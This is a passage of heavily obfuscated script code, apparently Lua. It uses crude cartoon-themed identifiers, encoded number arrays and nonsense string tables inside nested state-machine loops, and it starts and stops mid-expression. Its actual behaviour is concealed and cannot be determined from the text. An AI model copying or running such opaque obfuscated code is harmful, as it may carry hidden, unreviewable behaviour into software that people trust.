BungholeScore"})Knocker1=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787919,1919787788,1,1919787819,5,1919787852,1919787830,6,1919787954,1919787837},{" KnockerHuh DillButt CornholioTurd ButtHeadNads DillHuh"," DillMunch BeavisCrap DillDill ButtHeadPlop CornholioWuss"," DillWipe KnockerFart KnockerDumb ButtHeadButtHead FartHole"," FartBunghole HoleWipe BeavisButtHead BungholeMunch BeavisSchlong"," BeavisDumb BeavisWhoa BungholeAss FartScore KnockerMunch HoleDumb HoleWipe"," CornholioScore HoleMunch KnockerBunghole BungholeKnocker DillButtHead ButtHeadBunghole DillMunch FartWuss"},Knocker1)elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787906,1919787822,4,1919787820,5,1919787818,6,1919787816,7,1919787925,1919787798,1,1919787829,8,1919787934,1919787795,2,1919787807,2,1919787828},{" DillFart BungholeMunch BeavisScore BeavisWuss ButtHeadDammit BeavisHuh HoleHole"," FartHuh HoleBeavis BungholeSucks ButtHeadHeh CornholioSchlong"," ButtHeadCrap BeavisMunch ButtHeadDill BungholeGringo DillTp"," KnockerButt FartSucks HoleDill ButtHeadKnocker DillHuh DillBoing"," KnockerBoing FartGringo CornholioTurd BungholeDumb BeavisDumb FartTurd"," BeavisTurd KnockerTurd ButtHeadMunch BungholeKnocker HoleNads"," BungholeCrap BungholeTurd HoleDill FartBunghole FartWhoa"," BungholeCool BeavisDammit BungholeTp CornholioDiarrhea FartDiarrhea FartSchlong BeavisWipe"},Knocker1,not Munch1[65149])then Munch1[65149]=1;FireFire1=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787906,1919787822,4,1919787820,5,1919787818,6,1919787915,1919787817,7,1919787831,8,1919787926,1919787914,9,1919787824,10,1919787957,1919787839,11,1919787837,12,1919787961,2,1919787825},{" ButtHeadWuss DillHuh DillHeh FartGringo FartWipe CornholioScore"," KnockerNads CornholioButt FartDumb BeavisWuss HoleHeh"," KnockerBunghole CornholioWuss FartChode BungholeGringo CornholioDill"," KnockerChode FartTurd FartNads FartDumb BungholeDumb HoleChode"," HoleBeavis BungholeBoing KnockerNads BeavisGringo DillBunghole"," ButtHeadButtHead BeavisFire HoleButt DillHeh FartGringo"," DillBunghole ButtHeadButt CornholioAss BeavisDiarrhea BungholeSucks"," BungholeDiarrhea DillHeh BeavisChode FartWuss HoleScore"," BeavisDill FartBeavis KnockerBeavis FartCrap ButtHeadDumb CornholioKnocker"," BungholeSchlong BeavisAss BeavisTp KnockerHeh CornholioHuh"," HoleFart DillSucks FartDiarrhea CornholioPlop BungholeFire HoleWipe"," BeavisFart BungholeBunghole DillFire BungholeTp CornholioWhoa CornholioCrap"})Knocker1=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787849,1919787821,5,1919787819,6,1919787817,7,1919787831,8,1919787856,1919787795,1,1919787824,9,1919787867,1919787839,10,1919787963,1919787826},{" ButtHeadCornholio FartScore KnockerHeh"," CornholioScore HoleMunch DillPlop FartBunghole HoleAss"," ButtHeadDammit HoleButtHead FartBoing ButtHeadFart CornholioNads"," KnockerBoing FartHuh FartMunch ButtHeadHuh FartBeavis"," BungholeCool ButtHeadTurd ButtHeadCrap BungholeAss BeavisPlop DillMunch ButtHeadHeh"," CornholioTurd CornholioWuss HoleWipe FartWipe CornholioFire DillButt"," DillHuh CornholioCrap FartWipe DillFart FartChode"," DillMunch BeavisCrap CornholioTurd BungholeWuss BungholeDill"," CornholioHole DillTp FartTp KnockerWhoa KnockerWuss BeavisPlop ButtHeadBunghole BeavisHuh"," HoleChode CornholioDumb CornholioDiarrhea KnockerPlop ButtHeadDill BeavisButt KnockerDammit BungholeScore"},Knocker1)elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787849,1919787821,5,1919787819,6,1919787817,7,1919787831,8,1919787926,1919787795,1,1919787824,9,1919787923,1919787804,2,1919787804,2,1919787827},{" FartBeavis FartKnocker BungholeWipe FartHuh"," DillSchlong KnockerHeh DillGringo CornholioAss DillChode"," BungholeAss CornholioButtHead DillMunch DillTp ButtHeadCool"," BungholeSucks BeavisPlop HoleSchlong BungholeButt HoleChode"," BungholeWuss ButtHeadDiarrhea DillWipe BungholeChode HoleCrap KnockerAss FartKnocker"," BungholeGringo FartDiarrhea FartScore CornholioTp BeavisScore HoleWipe"," BungholeBeavis HoleDammit KnockerSchlong HoleNads ButtHeadWipe"," HoleDammit FartNads DillHole HoleDill KnockerHeh"," BeavisGringo KnockerChode BungholeTurd BungholeNads ButtHeadPlop BungholeSucks DillBoing"},Knocker1,not Munch1[84295])then elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787849,1919787821,5,1919787786,1,1919787817,6,1919787930,1919787799,2,1919787795,2,1919787832},{" BeavisChode CornholioFire HoleBunghole BungholeWhoa HoleWuss"," CornholioBoing FartButtHead CornholioMunch DillScore BeavisBeavis"," ButtHeadTp CornholioCool DillBeavis BeavisNads BeavisGringo"," DillFart KnockerScore CornholioHeh BungholeDiarrhea KnockerPlop"," DillDammit BeavisHole KnockerCrap BeavisWuss HoleAss FartSchlong"," HoleWipe ButtHeadWipe ButtHeadHole BungholeBeavis HoleBeavis DillAss KnockerCool"},Knocker1,not Munch1[84282])then Munch1[84282]=1;while AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787777,1,1919787926,3,1919787820,4,1919787937,1919787819,5,1919787817,5,1919787957,2,1919787928,1919787826,6,1919787933,1919787833},{" BeavisCornholio FartDammit FartButtHead KnockerCrap BungholeAss"," ButtHeadHeh ButtHeadBeavis ButtHeadPlop BungholeButtHead"," HoleHeh HoleWipe BeavisDammit DillDill FartWipe DillCool"," ButtHeadMunch CornholioBunghole DillKnocker DillAss DillNads"," BeavisNads DillPlop DillTp BeavisDammit KnockerCornholio ButtHeadNads ButtHeadChode",false},FireFire1)do local Plop1=36666;local Cornholio2={}local Bunghole2=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787844,1919787926,4,1919787820,5,1919787937,1919787945,0,1919787809},{" DillGringo CornholioPlop FartDammit BungholeBunghole HoleSchlong BungholeWhoa"," FartDiarrhea DillAss KnockerDammit HoleMunch ButtHeadWhoa"," BeavisChode CornholioFire HoleDammit CornholioNads CornholioWuss"," KnockerChode DillHeh ButtHeadWuss"," ButtHeadWhoa FartCrap HoleDill FartWipe KnockerNads CornholioBunghole"})while true do if AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787849,1919787821,5,1919787819,6,1919787914,1919787830,7,1919787828,8,1919787863,1919787827,9,1919787913,10,1919787804,16,1919787909,11,1919787835,12,1919787954,1919787908,0,1919787813,1,1919787897,1919787779,13,1919787936,1919787790,14,1919787937,1919787781},{" BeavisButt FartBeavis CornholioDumb ButtHeadNads ButtHeadChode"," KnockerHuh DillButt BungholeNads FartPlop BungholeDill"," HoleCrap KnockerCornholio DillDammit KnockerPlop CornholioDammit"," BeavisCornholio FartDammit FartTp BungholeMunch BeavisBunghole"," HoleTurd DillWhoa FartFart CornholioChode HoleCornholio"," ButtHeadWipe BeavisFart KnockerTurd DillDill ButtHeadPlop"," BeavisFart BungholeBunghole BeavisBoing CornholioHeh BeavisSchlong"," BungholeMunch BungholeButtHead ButtHeadBunghole HoleDumb ButtHeadHeh"," ButtHeadDiarrhea BungholeWhoa BungholeDill HoleWipe FartKnocker KnockerChode ButtHeadButt"," BeavisBoing CornholioHuh CornholioDammit BeavisBoing CornholioGringo"," FartBunghole BungholePlop FartMunch"," FartTurd CornholioFire ButtHeadChode FartDill FartDumb KnockerWuss"," DillWipe KnockerFart DillHole CornholioButt HoleButtHead",false},Bunghole2)then AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787849,1919787821,5,1919787819,6,1919787914,1919787830,7,1919787916,8,1919787826,9,1919787963,1919787955,0,1919787831},{" KnockerPlop ButtHeadScore CornholioDill BungholeScore CornholioCool"," CornholioMunch HoleNads CornholioWipe ButtHeadSchlong BeavisCool"," BungholeWuss KnockerDiarrhea KnockerScore ButtHeadWhoa BungholeCrap"," HoleScore FartTp DillTurd DillScore FartSucks"," HoleWhoa BungholeWipe FartFire DillPlop"," DillButtHead FartSucks ButtHeadFire HoleScore"," BungholeKnocker BeavisHole DillBunghole CornholioDiarrhea CornholioTurd DillDill HoleWuss"," BeavisDill ButtHeadHole ButtHeadBeavis BeavisDill KnockerWhoa"," ButtHeadBoing KnockerFart ButtHeadButtHead DillDill ButtHeadBunghole"})Bunghole2=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787819,6,1919787914,1919787918,7,1919787828,8,1919787961,1919787953,0,1919787833},{" FartBunghole HoleWipe CornholioChode ButtHeadFire BungholeTurd"," ButtHeadChode DillDill KnockerButtHead KnockerNads ButtHeadSucks"," KnockerSchlong DillHole FartTp CornholioGringo BungholeAss"," BungholeChode FartBunghole KnockerTurd CornholioWipe ButtHeadSchlong"," HoleBeavis BungholeBoing FartBeavis ButtHeadDill HoleFart"," KnockerBoing FartHuh ButtHeadWuss DillDammit BeavisCrap"," HoleSucks BungholeSucks KnockerDumb"," DillTp BungholeBoing DillWhoa ButtHeadHeh ButtHeadScore BungholeSchlong"})end;if AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787820,5,1919787913,1919787786,1,1919787817,6,1919787930,1919787799,2,1919787795,2,1919787832},{" CornholioWhoa FartCrap DillBunghole FartDammit KnockerSucks"," HoleDill KnockerDill KnockerAss CornholioChode KnockerFart"," HoleTp BungholeGringo BungholeMunch ButtHeadFire KnockerNads ButtHeadDill"," CornholioGringo CornholioCornholio KnockerWipe DillWhoa DillHole"," CornholioCornholio CornholioTurd KnockerWuss KnockerTp HoleGringo"," FartAss BungholeCrap ButtHeadFart CornholioPlop DillBunghole ButtHeadHeh KnockerScore"},Plop1,not Cornholio2[30921])then elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787906,1919787822,4,1919787820,5,1919787818,6,1919787853,1919787784,1,1919787831,7,1919787928,1919787793,2,1919787793,2,1919787830},{" KnockerTp ButtHeadCrap DillNads BeavisBunghole ButtHeadDammit DillMunch ButtHeadDiarrhea"," CornholioTurd FartDumb DillKnocker FartGringo HoleButtHead"," FartNads DillHuh ButtHeadWipe KnockerHuh BungholeBunghole"," FartGringo ButtHeadButt KnockerGringo HolePlop KnockerWhoa DillCool ButtHeadBoing"," KnockerWuss FartFire HoleDiarrhea CornholioDill BungholeTurd"," DillButt BeavisBeavis KnockerCrap CornholioDiarrhea HoleKnocker"," FartChode ButtHeadWhoa BungholeAss FartDiarrhea BungholeChode BungholeFire KnockerDammit"},Plop1,not Cornholio2[64549])then elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787778,1,1919787809,3,1919787906,1919787791,2,1919787787,2,1919787808},{" BeavisAss DillNads HoleAss DillSchlong BungholeTp BungholeTurd KnockerNads"," DillFart FartDumb ButtHeadFire DillButtHead KnockerPlop KnockerMunch HoleDumb"," FartCornholio HoleCornholio CornholioButtHead ButtHeadScore BeavisCornholio DillFart FartChode"},Plop1,not Cornholio2[36666])then Cornholio2[36666]=1;if AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787820,5,1919787855,1919787786,1,1919787921,6,1919787831,7,1919787966,1919787826,8,1919787824,9,1919787964,2,1919787921,1919787829},{" BeavisAss BungholeHeh KnockerNads ButtHeadBeavis HoleFire"," ButtHeadCornholio FartScore ButtHeadHuh DillButt FartChode"," BungholeChode CornholioBoing CornholioCool BungholeWhoa BeavisWipe DillCrap BeavisBeavis"," FartButt ButtHeadDill BungholeCrap BungholeBeavis BungholePlop"," KnockerSchlong DillHole BeavisFire KnockerCrap DillGringo"," HoleDumb CornholioDumb DillChode KnockerDill KnockerFire FartDill"," DillWipe FartDammit BungholeAss HoleHeh BeavisDiarrhea"," CornholioFire DillWuss KnockerBunghole CornholioDiarrhea HoleKnocker ButtHeadWipe HoleDumb"," BungholeCrap BungholeTurd ButtHeadScore DillNads ButtHeadButt ButtHeadBeavis BungholeGringo"},FireFire1)then local Beavis2=84695;local ButtHead2={}local FartKnocker2=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787906,1919787822,4,1919787924,5,1919787818,6,1919787939,1919787947,0,1919787839},{" BeavisCool CornholioDumb ButtHeadHuh DillButtHead BeavisHole BungholeTp BeavisKnocker"," CornholioNads DillDammit BeavisBeavis BeavisWhoa BungholeButt"," ButtHeadCool BeavisHeh KnockerFire FartCrap DillPlop"," KnockerCool BeavisFire DillMunch FartHuh KnockerTurd BeavisGringo DillTurd"," CornholioDammit CornholioWhoa ButtHeadBoing"," DillCrap ButtHeadNads BungholeFire ButtHeadDiarrhea FartGringo HoleButtHead"})while true do if AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787928,3,1919787789,16,1919787924,4,1919787818,5,1919787939,1919787947,0,1919787798,1,1919787854,1919787826,6,1919787921,1919787825,7,1919787922,1919787828},{" FartScore BungholeHole ButtHeadDiarrhea FartKnocker HoleSchlong"," KnockerSucks CornholioTp BungholeCornholio FartTurd HoleDill"," FartPlop FartHuh ButtHeadKnocker FartPlop ButtHeadCornholio"," CornholioButtHead KnockerBoing KnockerFire"," FartFart BeavisSchlong KnockerTp ButtHeadBeavis BeavisHuh HoleHole"," DillHole DillSchlong CornholioScore HoleChode HoleBeavis",false},FartKnocker2)then AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787926,4,1919787820,5,1919787937,1919787945,0,1919787809},{" BeavisScore KnockerAss KnockerMunch BungholeFire DillTp"," FartNads DillHuh ButtHeadBunghole HoleFart CornholioKnocker"," KnockerCornholio HoleHole BungholeScore HoleDammit ButtHeadKnocker KnockerAss CornholioBeavis"," FartAss CornholioFire KnockerMunch FartAss BeavisKnocker"," BeavisCrap CornholioButt CornholioWhoa DillButtHead CornholioBunghole"})FartKnocker2=AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787928,3,1919787822,4,1919787943,1919787951,0,1919787811},{" BungholeBunghole BeavisDumb ButtHeadHole HoleWuss FartTurd"," BeavisHeh BungholeButt DillWipe KnockerMunch BeavisButt"," HoleFire BeavisPlop ButtHeadSucks"," KnockerHole DillCool DillDumb CornholioButtHead BungholeMunch HoleTp"})end;if AlmightyBunghole({1919787815,1,1919787780,1,1919787811,2,1919787916,1919787789,2,1919787789,2,1919787810},{" CornholioGringo KnockerMunch KnockerHuh DillTurd HoleWipe HolePlop CornholioWipe"," ButtHeadNads BungholeAss CornholioButt ButtHeadKnocker DillCool ButtHeadTp CornholioChode"},Beavis2,not ButtHead2[44443])then ButtHead2[44443]=1;FireFire1=AlmightyBunghole({1919787815,1,1919787933,2,1919787811,3,1919787946,1919787822,4,1919787820,5,1919787944,2,1919787808},{" BungholeBoing BeavisBeavis DillCornholio BungholeBoing FartHeh CornholioButtHead ButtHeadCrap"," CornholioTp BeavisNads DillSchlong FartAss HoleHuh FartDammit"," KnockerCrap KnockerMunch CornholioBeavis HoleCornholio DillGringo"," HoleButt ButtHeadFart ButtHeadKnocker ButtHeadButt KnockerBeavis BeavisBoing KnockerCrap"," DillSucks BungholeScore BungholeHole KnockerCool HoleKnocker DillSchlong HoleFire"})break elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787777,1,1919787822,3,1919787905,1919787790,2,1919787786,2,1919787809},{" BungholeDiarrhea DillHeh DillBunghole DillTp ButtHeadButtHead"," HoleWipe ButtHeadWipe ButtHeadHole BeavisCool BungholePlop"," DillSchlong KnockerHeh DillGringo DillCornholio ButtHeadPlop HoleButt HoleCool"},Beavis2,not ButtHead2[81030])then elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787844,1919787822,4,1919787789,1,1919787818,5,1919787909,1919787786,2,1919787798,2,1919787837},{" KnockerCornholio BungholeWipe CornholioSchlong FartGringo ButtHeadKnocker FartWhoa CornholioButtHead"," BeavisMunch FartDiarrhea CornholioHole DillSucks KnockerGringo"," CornholioBeavis KnockerButt DillButtHead CornholioDammit HoleFart"," BungholeTp KnockerAss FartCool KnockerFart KnockerCool CornholioBoing FartSchlong"," KnockerSchlong DillHole HoleDiarrhea BungholeWipe CornholioBoing FartScore BungholeWhoa"},Beavis2,not ButtHead2[32035])then ButtHead2[32035]=1;Diarrhea1.k=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787809,4,1919787823,5,1919787918,1919787818,6,1919787816,7,1919787925,1919787919,8,1919787829,9,1919787960,1919787793,1,1919787964,1,1919787805,2,1919787834,10,1919787955,1919787868,1919787790},{" FartDill DillSucks HoleCrap FartFire FartAss FartBunghole ButtHeadFart"," CornholioTurd FartDammit ButtHeadCool DillCornholio BungholeHuh HoleChode HoleCool"," KnockerDiarrhea BungholeGringo HoleHole KnockerCool FartDiarrhea CornholioDammit KnockerDill"," HoleKnocker FartGringo BungholeFart CornholioFart CornholioCool"," HoleFire DillCool HoleDammit KnockerWipe HoleButt"," CornholioHeh DillDumb DillSchlong KnockerHuh HoleHole"," HoleNads HoleDill KnockerCrap BeavisWuss CornholioTurd"," KnockerButtHead FartCrap CornholioHeh KnockerChode HoleKnocker"," ButtHeadSchlong ButtHeadMunch CornholioHole DillSucks HoleCrap DillFire"," FartPlop ButtHeadButtHead"},Turd1,Diarrhea1)Beavis2=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787786,1,1919787817,6,1919787858,1919787828,7,1919787956,1919787835},{" KnockerHeh KnockerDammit FartButtHead FartDumb KnockerDiarrhea"," FartBunghole HoleWipe BeavisBoing FartDumb BeavisBunghole"," KnockerDiarrhea KnockerHole BeavisHeh DillCrap KnockerSucks"," DillMunch BeavisCrap FartScore ButtHeadGringo BeavisMunch"," HoleFart DillGringo DillSchlong DillChode HoleCornholio BeavisWuss CornholioCool"," BeavisFire KnockerKnocker FartDiarrhea BeavisGringo DillWhoa KnockerDammit"," CornholioWhoa FartCrap HoleHuh FartDammit DillWuss ButtHeadWhoa KnockerBoing BungholeBeavis"},Beavis2)elseif AlmightyBunghole({1919787815,1,1919787780,1,1919787811,2,1919787916,1919787789,2,1919787789,2,1919787810},{" ButtHeadHole HoleScore HoleSchlong FartWhoa BeavisMunch FartAss BeavisFire"," KnockerAss HoleHeh KnockerButtHead HoleAss KnockerGringo HoleDiarrhea BungholeWipe"},Beavis2,not ButtHead2[83987])then elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787809,4,1919787916,1919787789,1,1919787818,5,1919787909,1919787786,2,1919787798,2,1919787837},{" BungholeFire DillWuss KnockerWipe CornholioMunch KnockerDumb HoleTurd"," HoleCrap DillDammit KnockerSchlong ButtHeadBeavis BeavisBoing ButtHeadCrap DillWuss"," BeavisCornholio FartDammit CornholioChode ButtHeadCrap CornholioWhoa"," ButtHeadFart HoleTurd BungholeFart HoleScore KnockerCornholio"," HoleWuss HoleBoing CornholioHole DillSucks HoleCrap"},Beavis2,not ButtHead2[477])then elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787820,5,1919787913,1919787786,1,1919787817,6,1919787930,1919787799,2,1919787795,2,1919787832},{" KnockerTp CornholioSchlong BeavisKnocker BeavisWuss FartScore"," CornholioMunch HoleNads BeavisWhoa ButtHeadSchlong KnockerFire"," HoleCrap FartCornholio BungholeCool KnockerGringo BeavisHole DillMunch BungholeTurd"," BungholeSchlong HoleHole DillFire BungholeTp KnockerWuss"," BeavisTurd KnockerTurd KnockerFart BungholeKnocker KnockerNads"," ButtHeadDammit HoleButtHead DillGringo HoleBunghole FartSchlong DillWhoa DillScore"},Beavis2,not ButtHead2[34952])then ButtHead2[34952]=1;Diarrhea1.i=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787844,1919787822,4,1919787820,5,1919787818,6,1919787915,1919787817,7,1919787831,8,1919787926,1919787914,9,1919787824,10,1919787957,1919787839,11,1919787837,12,1919787961,2,1919787825},{" DillChode KnockerScore HoleSchlong CornholioHole CornholioFire CornholioBeavis BungholeTp"," DillWipe KnockerFart KnockerDammit KnockerScore HoleButtHead"," DillSucks BungholeScore ButtHeadAss KnockerSchlong KnockerTp"," FartGringo CornholioSucks ButtHeadTp FartNads ButtHeadKnocker DillButtHead"," CornholioHuh KnockerSucks DillDiarrhea KnockerDiarrhea KnockerNads"," CornholioGringo CornholioCornholio CornholioPlop DillTurd ButtHeadDiarrhea"," BungholeDumb HolePlop FartDumb BeavisBunghole FartScore"," HolePlop DillBunghole ButtHeadCornholio BeavisDill KnockerFart"," BeavisKnocker BungholeWuss HoleHuh CornholioKnocker FartButt HoleDill"," BungholeHole ButtHeadSucks FartDill FartNads KnockerDiarrhea"," BungholeWipe BeavisCool BungholeChode BungholeFire KnockerDammit FartKnocker FartCornholio"," BungholeButt HoleScore FartMunch DillBeavis DillFart HoleGringo BeavisHeh"})Beavis2=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787820,5,1919787855,1919787819,6,1919787817,7,1919787858,1919787828,8,1919787826,9,1919787923,1919787792,1,1919787839,10,1919787864,1919787834,11,1919787966,1919787825},{" ButtHeadCrap BeavisMunch BeavisGringo DillBunghole"," BeavisTurd KnockerTurd FartMunch DillDammit BeavisPlop"," DillHuh BeavisFart CornholioFire BungholeBeavis FartFire CornholioBeavis"," HoleDiarrhea ButtHeadSchlong CornholioCrap CornholioPlop DillTurd"," BungholeSucks BeavisPlop HoleWhoa CornholioScore BungholeBeavis"," FartKnocker BeavisChode BungholeButtHead CornholioButtHead BungholeHole"," HoleChode CornholioDumb DillBeavis ButtHeadBoing ButtHeadDill"," FartAss BungholeCrap ButtHeadBoing KnockerMunch DillMunch"," HoleCool CornholioPlop ButtHeadButt KnockerGringo CornholioBeavis"," DillKnocker ButtHeadBunghole KnockerBoing CornholioCornholio BeavisHole BungholeMunch"," BeavisTp ButtHeadDumb DillDumb BeavisHole HoleTurd HoleTp HoleAss HoleGringo"},Beavis2)elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787919,1919787788,1,1919787819,5,1919787908,1919787797,2,1919787797,2,1919787834},{" BungholeFire KnockerNads KnockerCornholio ButtHeadPlop KnockerFire"," BungholeButt HoleScore DillPlop HoleTp"," KnockerSucks CornholioTp HoleButt KnockerHole ButtHeadTurd"," CornholioButt DillMunch BeavisCool DillFire KnockerWhoa"," HoleGringo CornholioHole BungholeTurd DillDill CornholioNads CornholioMunch KnockerHole"},Beavis2,not ButtHead2[54981])then ButtHead2[54981]=1;Diarrhea1.l=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787809,4,1919787916,1919787820,5,1919787818,6,1919787853,1919787817,7,1919787831,8,1919787926,1919787795,1,1919787912,9,1919787838,10,1919787959,1919787837,11,1919787835,12,1919787963,2,1919787920,1919787788},{" ButtHeadTp KnockerChode BungholeButt KnockerBeavis ButtHeadDumb CornholioKnocker"," ButtHeadSucks FartBunghole DillFart FartFart KnockerWipe HoleWipe HoleDill"," HoleNads HoleDill ButtHeadFire FartBoing CornholioAss"," BeavisScore KnockerAss ButtHeadBunghole DillMunch KnockerDammit"," DillGringo BungholePlop BeavisHuh DillCrap ButtHeadButtHead"," FartCool FartWipe CornholioWhoa HoleBunghole BungholeHeh"," CornholioTp KnockerBoing DillButtHead ButtHeadDill BeavisHuh"," HolePlop DillBunghole KnockerFire FartCrap BungholeHole"," BeavisSchlong KnockerDill BeavisKnocker BungholeAss ButtHeadCool FartCornholio"," DillChode HolePlop CornholioCrap BungholeBoing BungholeDill"," CornholioWuss BeavisNads ButtHeadWhoa BeavisTurd KnockerBeavis CornholioBeavis"," FartWhoa HoleSucks ButtHeadCrap BungholeDiarrhea HoleBunghole FartSchlong"},#Crap1)Beavis2=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787919,1919787821,5,1919787819,6,1919787817,7,1919787858,1919787828,8,1919787795,1,1919787824,9,1919787867,1919787839,10,1919787963,1919787826},{" FartBunghole HoleWipe BeavisBoing CornholioKnocker FartBoing"," BungholeMunch BungholeButtHead FartSchlong BeavisWipe"," KnockerCool FartTurd HoleFire BungholeFart FartHuh"," DillHole DillSchlong KnockerBoing BungholeBeavis FartButtHead"," HoleTurd ButtHeadButt BeavisFire KnockerFart DillDammit HoleKnocker ButtHeadDammit"," CornholioCrap ButtHeadAss HoleHole ButtHeadButtHead FartHole"," KnockerCrap ButtHeadChode CornholioPlop KnockerHuh FartDammit"," FartPlop HoleSucks CornholioCrap ButtHeadKnocker CornholioHuh DillFire HoleTurd"," BungholeSchlong HoleHole FartDill KnockerBunghole CornholioDiarrhea HoleAss DillSchlong"," DillChode KnockerCool CornholioButt CornholioHole BeavisTurd KnockerBeavis CornholioBeavis BungholeMunch"},Beavis2)elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787778,1,1919787809,3,1919787906,1919787791,2,1919787787,2,1919787808},{" CornholioFart BeavisHuh HoleCornholio CornholioBoing CornholioHole BeavisFart ButtHeadSchlong"," FartCrap BungholeHeh CornholioFire HoleCool HoleCornholio BungholeKnocker"," BungholeGringo CornholioHuh FartDiarrhea BeavisDiarrhea CornholioMunch FartDammit ButtHeadTurd"},Beavis2,not ButtHead2[84695])then ButtHead2[84695]=1;Diarrhea1.r={}Beavis2=AlmightyBunghole({1919787815,1,1919787813,2,1919787778,1,1919787809,3,1919787850,1919787820,4,1919787948,1919787811},{" CornholioBeavis KnockerWuss KnockerBeavis BeavisHole DillBunghole HoleTp FartDiarrhea"," BungholeTp BungholeBeavis FartCrap HoleCornholio CornholioGringo CornholioBoing DillDill"," KnockerHole KnockerMunch CornholioScore HoleChode CornholioChode KnockerCrap CornholioDiarrhea"," KnockerSucks CornholioTp BeavisMunch DillHeh FartSucks DillNads DillButt BeavisDumb"},Beavis2)end end elseif AlmightyBunghole({1919787815,1,1919787813,2,1919787904,1919787808,3,1919787822,4,1919787849,1919787821,5,1919787819,6,1919787914,1919787830,7,1919787828,8,1919787863,1919787794,1,1919787913,9,1919787839,10,1919787958,1919787834,11,1919787832,12,1919787908,2,1919787945,1919787789},{" BungholeAss CornholioButtHead DillMunch FartWuss BungholeScore"," BungholeSchlong HoleHole BungholePlop FartMunch DillBeavis"," BeavisChode CornholioFire BungholeNads BungholeBoing DillTurd"," BeavisGringo KnockerChode HoleScore DillDill BungholeWuss"," ButtHeadGringo FartBoing FartSucks ButtHeadKnocker DillFart"," KnockerAss HoleHeh DillNads DillButt FartCool"," KnockerWipe KnockerWuss DillWuss BungholeSchlong BungholeButt"," HoleAss ButtHeadTurd CornholioHeh FartBoing HoleBoing"," BungholeBunghole ButtHeadGringo BungholeCornholio KnockerDammit CornholioButtHead FartMunch"," FartAss ButtHeadFart CornholioCornholio BeavisHeh KnockerCrap"," HoleMunch CornholioChode BungholeDill FartButt CornholioButt CornholioHole CornholioHuh"," CornholioBunghole FartCornholio BungholeAss ButtHeadFart ButtHeadWipe BeavisWipe BungholeDammit"},FireFire1)then local Dillhole2=14418;local Gringo2={}local AlmightyBunghole2=AlmightyBunghole({1919787815,1,1919787813,2,1919787846,1919787808,3,1919787822,4,1919787820,5,1919787855,1919787923,6,1919787817,7,1919787964,1919787958,0,1919787834},{" ButtHeadCrap BeavisMunch ButtHeadDammit KnockerHuh"," KnockerFire HoleBunghole FartWipe BungholeCool CornholioBunghole"," FartChode DillDammit ButtHeadButt HoleBunghole BungholeChode FartDammit BungholeAss"," ButtHeadButtHead BeavisFire CornholioWuss FartTurd CornholioSchlong"," CornholioDumb KnockerCrap DillBoing HoleDill DillNads"," CornholioHeh FartChode FartAss"," FartBunghole HoleDiarrhea BungholeTp KnockerWuss FartScore CornholioDammit"})while true do if AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787844,1919787926,4,1919787791,16,1919787922,5,1919787816,6,1919787965,1919787957,0,1919787796,1,1919787848,1919787824,7,1919787935,1919787839,8,1919787920,1919787826},{" CornholioGringo FartChode CornholioNads DillWhoa BeavisBunghole HoleSchlong"," ButtHeadTp CornholioCool BungholeKnocker KnockerNads HoleGringo"," ButtHeadBeavis BungholeSchlong BeavisBunghole CornholioAss CornholioNads"," HoleChode BungholeSchlong KnockerPlop HoleChode BeavisButtHead"," DillScore BungholeHeh BungholeSucks"," FartButt BeavisTurd DillHuh KnockerHole BungholeTp KnockerSchlong"," DillWuss HoleDiarrhea BungholeButtHead BeavisDill DillPlop",false},AlmightyBunghole2)then AlmightyBunghole({1919787815,1,1919787933,2,1919787811,3,1919787946,1919787948,0,1919787812},{" CornholioSchlong DillHuh KnockerDumb FartGringo BungholeHole CornholioFire FartChode"," CornholioTp ButtHeadButt BungholeChode CornholioTp FartWuss"," HoleTurd HoleButt HoleDiarrhea ButtHeadCrap ButtHeadHuh"})AlmightyBunghole2=AlmightyBunghole({1919787815,1,1919787813,2,1919787811,3,1919787906,1919787822,4,1919787820,5,1919787855,1919787923,6,1919787817,7,1919787964,1919787958,0,1919787834},{" DillCornholio BungholeSucks BungholeTurd FartSucks BungholeCool ButtHeadButt"," BeavisBoing BungholeHuh BeavisPlop HoleGringo DillMunch"," HoleBunghole DillDiarrhea BungholeBunghole ButtHeadButtHead HoleWhoa"," HoleDammit FartNads ButtHeadHeh HoleDill HoleSchlong"," CornholioDill KnockerBeavis BungholeHeh CornholioMunch FartFire"," ButtHeadCrap KnockerBeavis 